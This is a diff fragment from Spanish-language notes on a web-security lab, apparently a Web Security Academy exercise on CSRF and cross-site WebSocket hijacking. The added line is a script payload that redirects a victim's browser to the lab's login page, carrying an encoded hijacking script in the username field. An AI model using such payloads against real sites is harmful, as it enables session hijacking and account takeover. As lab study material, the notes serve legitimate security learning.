@@ -113,3 +113,6 @@ a esto
 ahora nuestro payload encodeado podemos enviarlo en la misma petición donde hemos encontrado el CSRF. y podemos ver que la solicitud se muestra tal y como estaba antes de ser encodeada
 ![[Pasted image 20250721173524.png]]
 
+```python
+`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; </script>
+```
